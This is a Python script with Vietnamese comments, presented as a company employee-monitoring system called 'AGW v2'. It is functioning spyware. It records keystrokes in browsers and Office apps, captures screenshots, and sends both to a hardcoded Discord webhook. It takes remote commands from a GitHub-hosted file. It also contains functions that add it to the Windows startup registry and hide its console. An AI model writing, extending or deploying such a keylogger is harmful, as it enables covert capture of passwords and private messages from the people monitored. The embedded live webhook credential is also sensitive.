import psutil
import time
import requests
import json
import os
import socket
import platform
import logging
import re
import hashlib
import base64
import threading
import sys
import winreg
from datetime import datetime
from pathlib import Path
from pynput import keyboard
import win32gui
import win32process
import mss
from PIL import Image

# ==================== CẤU HÌNH (đã bổ sung) ====================
CONFIG = {
    "discord_webhook": "https://discord.com/api/webhooks/1489246380999573665/mMBZkTa2fBi3Pji8YEvER1w7KxhKhbWY5-RT0Z4CZb75IupI5APUBsTvAA0xwVNAv4iI",
    "monitor_interval": 5,
    "log_dir": r"C:\Users\ADMIN\Desktop\log\MonitoringAgent",
    "max_log_size_mb": 100,
    "monitored_apps": ["winword.exe", "excel.exe", "powerpnt.exe", "chrome.exe", "firefox.exe", "msedge.exe", "notepad.exe"],
    "excluded_apps": ["oq", "fg", "jh"],
    "alert_unknown_apps": True,
    "monitor_usb": True,
    "company_name": "CÔNG TY CỦA BẠN",
    "enable_keylogging": True,
    "key_buffer_size": 500,
    
    # ====================== TÍNH NĂNG MỚI ======================
    "remote_control_url": "https://raw.githubusercontent.com/keriaTH/detect_text/refs/heads/main/command.txt",  # <<< THAY BẰNG LINK CỦA BẠN
    "remote_check_interval": 5,   # kiểm tra lệnh nhanh hơn (giảm từ 15 xuống 5 giây)
    "screenshot_quality": 85,
    "screenshot_interval": 30,
    "max_screenshots_per_hour": 120,  # Giới hạn screenshot mỗi giờ
}

# ==================== KHỞI TẠO ====================
Path(CONFIG["log_dir"]).mkdir(parents=True, exist_ok=True)

log_file = os.path.join(CONFIG["log_dir"], f"{socket.gethostname()}_monitor.log")
keylog_file = os.path.join(CONFIG["log_dir"], f"{socket.gethostname()}_keylog.log")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_file, encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

COMPUTER_NAME = socket.gethostname()
OS_NAME = platform.system() + " " + platform.release()

# Flag tắt từ xa
shutdown_flag = False
screenshot_mode = False  # chụp liên tục hay không



# ==================== HÀM CHỤP MÀN HÌNH (HOÀN TOÀN IM LẶNG) ====================
def take_screenshot():
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # màn hình chính
            screenshot = sct.grab(monitor)
            img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
            
            # Nén ảnh
            temp_path = os.path.join(CONFIG["log_dir"], f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
            img.save(temp_path, quality=CONFIG["screenshot_quality"])
            
            # Gửi lên Discord
            with open(temp_path, "rb") as f:
                files = {"file": (os.path.basename(temp_path), f, "image/jpeg")}
                payload = {
                    "content": f"📸 **Screenshot từ {COMPUTER_NAME}** - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                }
                requests.post(CONFIG["discord_webhook"], data=payload, files=files, timeout=15)
            
            # Xóa file tạm sau khi gửi
            os.remove(temp_path)
            logger.info("Screenshot đã gửi thành công")
            return True
    except Exception as e:
        logger.error(f"Screenshot error: {e}")
        return False




# ==================== BỘ LỌC & CLEAN ====================
class SensitiveDataFilter:
    @classmethod
    def filter(cls, text):
        return text

def clean_content(content):
    content = content.replace('·', '')
    while '[BACKSPACE]' in content:
        idx = content.find('[BACKSPACE]')
        if idx > 0:
            content = content[:idx-1] + content[idx+len('[BACKSPACE]'):]
        else:
            content = content[len('[BACKSPACE]'):]
    while '[DELETE]' in content:
        idx = content.find('[DELETE]')
        if idx < len(content) - 1:
            content = content[:idx] + content[idx+1+len('[DELETE]'):]
        else:
            content = content[:idx]
    return content

# ==================== HÀM MỚI: TỰ ĐỘNG KHỞI ĐỘNG + ẨN + REMOTE ====================
def add_to_startup():
    """Thêm vào registry để tự chạy khi máy bật"""
    try:
        key = winreg.HKEY_CURRENT_USER
        sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = winreg.OpenKey(key, sub_key, 0, winreg.KEY_SET_VALUE)
        
        script_path = os.path.abspath(__file__)
        # Ưu tiên pythonw.exe để chạy ngầm (không hiện console)
        python_exe = sys.executable.replace("python.exe", "pythonw.exe")
        if not os.path.exists(python_exe):
            python_exe = sys.executable
            
        cmd = f'"{python_exe}" "{script_path}"'
        winreg.SetValueEx(reg_key, "AGW_Monitor", 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(reg_key)
        
        logger.info("✅ Đã thêm vào Startup Registry")
        send_to_discord("🚀 Đã thiết lập **tự động chạy khi khởi động**", level="startup")
    except Exception as e:
        logger.warning(f"Không thêm được startup (có thể cần quyền admin): {e}")

def hide_console():
    """Ẩn cửa sổ console"""
    try:
        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, 0)  # SW_HIDE
        logger.info("Console window đã bị ẩn")
    except:
        pass

def monitor_usb_thread():
    """Giám sát USB cắm vào máy"""
    previous_drives = set()
    while True:
        if not CONFIG["monitor_usb"]:
            time.sleep(60)
            continue
        try:
            current_drives = set()
            for partition in psutil.disk_partitions():
                if 'removable' in partition.opts.lower():
                    current_drives.add(partition.device)
            
            new_drives = current_drives - previous_drives
            for drive in new_drives:
                msg = f"🚨 **USB ĐƯỢC CẮM**: {drive} - Có thể chứa dữ liệu nhạy cảm!"
                send_to_discord(msg, level="alert")
                logger.warning(msg)
            
            previous_drives = current_drives.copy()
        except Exception as e:
            logger.debug(f"USB monitor error: {e}")
        time.sleep(5)

# ==================== REMOTE CONTROL (đã bổ sung screenshot) ====================
def remote_control_thread():
    global shutdown_flag, screenshot_mode
    while True:
        try:
            # Sử dụng GitHub API để bypass cache hoàn toàn
            api_url = "https://api.github.com/repos/keriaTH/detect_text/contents/command.txt"
            resp = requests.get(api_url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                # Decode base64 content
                import base64
                cmd = base64.b64decode(data['content']).decode('utf-8').strip().lower()
                
                if cmd == "shutdown" and not shutdown_flag:
                    shutdown_flag = True
                    send_to_discord("🛑 **LỆNH TẮT TỪ XA** đã nhận. Đang dừng...", level="alert")
                
                elif cmd == "screenshot":
                    send_to_discord("📸 Đang chụp màn hình theo lệnh từ xa...", level="info")
                    threading.Thread(target=take_screenshot, daemon=True).start()
                
                elif cmd == "screenshot_every_30s":
                    screenshot_mode = True
                    send_to_discord("📸 **Chế độ chụp liên tục** đã BẬT (mỗi 30 giây)", level="info")
                
                elif cmd == "screenshot_stop":
                    screenshot_mode = False
                    send_to_discord("📸 Chế độ chụp liên tục đã TẮT", level="info")
                
                elif cmd == "status":
                    send_to_discord(f"💓 **STATUS**: Đang chạy - Screenshot mode: {'ON' if screenshot_mode else 'OFF'}", level="info")
        except:
            pass
        time.sleep(CONFIG["remote_check_interval"])

# ==================== CHỤP LIÊN TỤC (nếu bật) ====================
def continuous_screenshot_thread():
    global screenshot_mode
    count = 0
    while True:
        if screenshot_mode:
            take_screenshot()
            count += 1
            if count >= CONFIG["max_screenshots_per_hour"]:
                screenshot_mode = False
                send_to_discord("⚠️ Đã đạt giới hạn screenshot/giờ, tự động tắt chế độ liên tục", level="warning")
        time.sleep(CONFIG["screenshot_interval"])

# ==================== CÁC HÀM CŨ (giữ nguyên + tối ưu nhẹ) ====================
def send_to_discord(message, level="info"):
    if not CONFIG["discord_webhook"] or "YOUR_WEBHOOK" in CONFIG["discord_webhook"]:
        return
    emoji = {"info": "ℹ️", "warning": "⚠️", "alert": "🚨", "startup": "🟢", "shutdown": "⛔"}.get(level, "📌")
    data = {
        "content": f"{emoji} **[{COMPUTER_NAME}]** {message}",
        "username": f"Giám sát {CONFIG['company_name']}"
    }
    try:
        requests.post(CONFIG["discord_webhook"], json=data, timeout=10)
    except:
        pass

def get_active_window_info():
    try:
        hwnd = win32gui.GetForegroundWindow()
        window_title = win32gui.GetWindowText(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        app_name = psutil.Process(pid).name().lower() if pid else "unknown"
        return {"title": window_title[:200], "app": app_name, "pid": pid}
    except:
        return None

def should_log_key():
    if not CONFIG["enable_keylogging"]:
        return False
    window_info = get_active_window_info()
    if not window_info:
        return False
    app = window_info["app"]
    if any(ex in app for ex in CONFIG["excluded_apps"]):
        return False
    if CONFIG["monitored_apps"] and app not in CONFIG["monitored_apps"]:
        return False
    return True

# ==================== KEYLOGGER (giữ nguyên + ổn định) ====================
class SmartKeylogger:
    def __init__(self):
        self.key_buffer = []
        self.buffer_lock = threading.Lock()
        self.flush_interval = 30
        self.listener = None

    def on_press(self, key):
        if not should_log_key():
            return
        try:
            if hasattr(key, 'char') and key.char is not None:
                key_char = key.char
            else:
                special_map = {
                    keyboard.Key.space: ' ', keyboard.Key.enter: '\n', keyboard.Key.tab: '\t',
                    keyboard.Key.backspace: '[BACKSPACE]', keyboard.Key.delete: '[DELETE]',
                    keyboard.Key.up: '[↑]', keyboard.Key.down: '[↓]',
                    keyboard.Key.left: '[←]', keyboard.Key.right: '[→]',
                }
                key_char = special_map.get(key, f'[{key.name.upper()}]')
            
            with self.buffer_lock:
                self.key_buffer.append(key_char)
        except:
            pass

    def flush(self):
        with self.buffer_lock:
            if not self.key_buffer:
                return
            content = ''.join(self.key_buffer)
            self.key_buffer.clear()
        
        content = clean_content(content)
        if not content.strip():
            return

        window_info = get_active_window_info()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        log_entry = {
            "timestamp": timestamp,
            "computer": COMPUTER_NAME,
            "app": window_info["app"] if window_info else "unknown",
            "window_title": window_info["title"] if window_info else "",
            "content": content,
            "length": len(content)
        }
        
        with open(keylog_file, 'a', encoding='utf-8') as f:
            f.write(json.dumps(log_entry, ensure_ascii=False) + '\n')
        
        self.send_to_discord(window_info, content, timestamp)

    def send_to_discord(self, window_info, content, timestamp):
        # (giữ nguyên code gửi embed đẹp của bạn)
        if not CONFIG["discord_webhook"] or "YOUR_WEBHOOK" in CONFIG["discord_webhook"]:
            return
        app_name = window_info["app"] if window_info else "unknown"
        window_title = window_info["title"] if window_info else ""
        displayed_content = content if len(content) <= 1500 else content[:1500] + "...[cắt]"
        
        embed = {
            "title": "⌨️ BÁO CÁO HOẠT ĐỘNG NHẬP LIỆU",
            "color": 3447003,
            "fields": [
                {"name": "🕐 Thời Gian", "value": timestamp, "inline": True},
                {"name": "📱 Ứng Dụng", "value": f"`{app_name}`", "inline": False},
                {"name": "🪟 Tiêu Đề Cửa Sổ", "value": window_title[:150] or "N/A", "inline": False},
                {"name": "📝 Nội Dung Đã Gõ", "value": f"```{displayed_content}```", "inline": False},
                {"name": "📊 Thống Kê", "value": f"Tổng: {len(content)} ký tự", "inline": True}
            ]
        }
        data = {"embeds": [embed], "username": f"Bot Giám Sát - {CONFIG['company_name']}"}
        try:
            requests.post(CONFIG["discord_webhook"], json=data, timeout=10)
        except:
            pass

    def start(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        def periodic_flush():
            while True:
                time.sleep(self.flush_interval)
                self.flush()
        threading.Thread(target=periodic_flush, daemon=True).start()
        logger.info("Keylogger started")
        send_to_discord("⌨️ **Giám sát nhập liệu khởi động**", level="startup")

    def stop(self):
        if self.listener:
            self.flush()
            self.listener.stop()
        logger.info("Keylogger stopped")

# ==================== BANNER & MAIN ====================
def print_startup_banner():
    banner = f"""
    ╔══════════════════════════════════════════════════════════════════╗
    ║                    HỆ THỐNG GIÁM SÁT AGW v2                     ║
    ╠══════════════════════════════════════════════════════════════════╣
    ║  Công ty : {CONFIG['company_name']:<48} ║
    ║  Máy     : {COMPUTER_NAME:<48} ║
    ║  OS      : {OS_NAME:<48} ║
    ║  Start   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<48} ║
    ╚══════════════════════════════════════════════════════════════════╝
    """
    print(banner)
    logger.info("STARTING MONITORING SYSTEM v2")
    send_to_discord("🚀 **Hệ thống giám sát phiên bản 2 đã khởi động**", level="startup")

def main():
    global shutdown_flag
    print_startup_banner()
    
    # add_to_startup()
    # hide_console()
    
    # Khởi động remote control
    threading.Thread(target=remote_control_thread, daemon=True).start()
    
    # # Khởi động USB monitor
    # if CONFIG["monitor_usb"]:
    #     threading.Thread(target=monitor_usb_thread, daemon=True).start()
    #     logger.info("USB monitoring started")

    threading.Thread(target=continuous_screenshot_thread, daemon=True).start()
    # Khởi động keylogger
    keylogger = SmartKeylogger()
    keylogger.start()
    
    cycle_count = 0
    try:
        while True:
            cycle_count += 1
            if cycle_count % 30 == 0:
                send_to_discord(f"💓 **Heartbeat** - Cycle {cycle_count} - Đang hoạt động bình thường", level="info")
            
            if shutdown_flag:
                keylogger.stop()
                logger.info("=== MONITORING STOPPED BY REMOTE COMMAND ===")
                send_to_discord("🛑 **Hệ thống đã dừng theo lệnh từ xa**", level="shutdown")
                break
            
            time.sleep(CONFIG["monitor_interval"])
            
    except KeyboardInterrupt:
        keylogger.stop()
        logger.info("=== MONITORING STOPPED MANUALLY ===")
        send_to_discord("🛑 **Hệ thống giám sát dừng lại**", level="shutdown")
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        send_to_discord(f"❌ Lỗi bất ngờ: {e}", level="alert")

if __name__ == "__main__":
    main()
